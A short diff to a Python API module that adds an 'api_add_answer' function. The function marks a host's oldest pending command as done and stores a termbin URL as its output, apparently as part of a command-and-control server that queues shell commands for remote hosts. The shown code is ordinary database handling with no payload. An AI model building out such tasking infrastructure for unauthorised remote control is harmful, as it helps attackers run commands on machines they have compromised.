@@ -114,8 +114,6 @@ def api_get_command(host_id):
 # ===============================================
 
 
-
-
 # add command by host hash
 # ===============================================
 def api_add_command(host_id, cmd):
@@ -124,3 +122,23 @@ def api_add_command(host_id, cmd):
 	success = insert_db(conn, "INSERT INTO commands(command, fk_host_id) VALUES (?,?)", (cmd, host_id));
 	return str(success)
 # ===============================================
+
+
+
+# add answer for host
+# ===============================================
+def api_add_answer(host, termbin_url):
+	conn = get_db()
+
+	host_id = select_db(conn, "SELECT host_id FROM hosts WHERE hostname = ?", (host,))
+	host_id = host_id[0][0]
+
+	command_id = select_db(conn, "SELECT command_id FROM commands WHERE fk_host_id = ? AND status = 0 ORDER BY command_id ASC LIMIT 1", (host_id,))
+	command_id = command_id[0][0]
+
+	success = insert_db(conn, "UPDATE commands SET answer_url = ?, status = 1, answer_time = strftime('%d-%m-%Y %H:%M:%S','now', 'localtime') WHERE command_id = ? AND fk_host_id = ?", (termbin_url, command_id, host_id));
+
+	return str(success)
+# ===============================================
+
+
